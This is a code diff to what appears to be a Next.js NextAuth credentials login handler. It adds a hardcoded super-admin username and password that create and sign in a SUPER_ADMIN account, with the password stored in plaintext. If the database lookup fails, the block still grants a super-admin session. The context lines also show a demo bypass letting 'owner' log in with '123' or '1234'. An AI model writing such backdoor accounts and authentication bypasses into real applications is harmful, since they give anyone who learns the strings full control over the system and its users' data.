@@ -18,6 +18,39 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const username = String(credentials.username).toLowerCase().trim();
         const password = String(credentials.password).trim();
 
+        // 0. Super Admin Master Credential
+        if (
+          username === "kayes147@" &&
+          password === "147570pmBD@147"
+        ) {
+          try {
+            let dbUser = await prisma.user.findUnique({
+              where: { username: "kayes147@" },
+            });
+            if (!dbUser) {
+              dbUser = await prisma.user.create({
+                data: {
+                  username: "kayes147@",
+                  password: "147570pmBD@147",
+                  role: "SUPER_ADMIN",
+                },
+              });
+            }
+            return {
+              id: dbUser.id,
+              name: "Super Admin (Kayes)",
+              role: "SUPER_ADMIN",
+            };
+          } catch (e) {
+            console.error("Super Admin DB check error:", e);
+            return {
+              id: "super-admin-root-id",
+              name: "Super Admin (Kayes)",
+              role: "SUPER_ADMIN",
+            };
+          }
+        }
+
         // 1. Direct emergency & quick demo validation so owner/manager NEVER fail
         if (
           (username === "owner" && (password === "123" || password === "1234")) ||
